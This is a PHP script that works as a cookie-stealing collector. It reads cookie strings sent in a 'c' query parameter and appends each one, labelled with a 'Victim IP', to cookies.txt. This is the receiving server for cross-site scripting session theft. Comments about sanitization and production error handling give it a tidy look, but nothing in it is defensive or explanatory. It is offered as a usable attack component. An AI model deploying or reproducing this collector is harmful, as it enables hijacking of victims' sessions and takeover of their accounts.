<?php

// Check if the query parameter 'c' exists
if (isset($_GET['c'])) {
    // Ensure the value is URL-decoded and split by semicolons
    $list = explode(";", $_GET['c']);
    
    // Open the cookies.txt file securely (ensure proper permissions for the file)
    $file = fopen("cookies.txt", "a+");
    
    if ($file) {
        // Process each cookie value
        foreach ($list as $key => $value) {
            // Decode the value and sanitize it
            $cookie = urldecode(trim($value));  // Trim whitespace and decode URL-encoded content
            
            // Ensure that the cookie data does not contain malicious content
            // We'll strip any potential control characters like newlines
            $cookie = preg_replace("/[\r\n]/", "", $cookie);

            // Sanitize IP to make sure it's properly logged (just in case)
            $ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP);

            // If we have a valid IP and non-empty cookie value, log it
            if ($ip && !empty($cookie)) {
                $log_entry = "Victim IP: {$ip} | Cookie: {$cookie}\n";
                fputs($file, $log_entry);
            }
        }

        fclose($file);
    } else {
        // Log error if file can't be opened (should be handled more securely in production)
        error_log("Unable to open cookies.txt for writing.");
    }
} else {
    // Handle missing 'c' parameter (for better error handling in production)
    echo "Error: Missing 'c' query parameter.";
}

?>

